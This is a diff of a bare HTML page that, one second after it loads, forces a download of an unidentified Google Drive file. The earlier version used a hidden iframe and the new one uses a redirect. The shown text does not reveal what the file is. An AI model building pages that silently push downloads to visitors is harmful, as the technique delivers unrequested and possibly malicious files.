@@ -1,25 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>Auto Download</title>
-</head>
-
 <body>
 
 <script>
 window.onload = function() {
 
-  setTimeout(function(){
-
-    var iframe = document.createElement("iframe");
-    iframe.style.display = "none";
-
-    iframe.src = "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=2fd86e2c-3607-49fa-9e91-ac198eae5e46&at=AGN2oQ1rJLXpYieZleCfJPt2IM4z:1773900320983";
-
-    document.body.appendChild(iframe);
-
-  }, 1000);
+  setTimeout(function() {
+    window.location.href =
+    "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=2fd86e2c-3607-49fa-9e91-ac198eae5e46&at=AGN2oQ1rJLXpYieZleCfJPt2IM4z:1773900320983";
+  },1000);
 
 }
 </script>
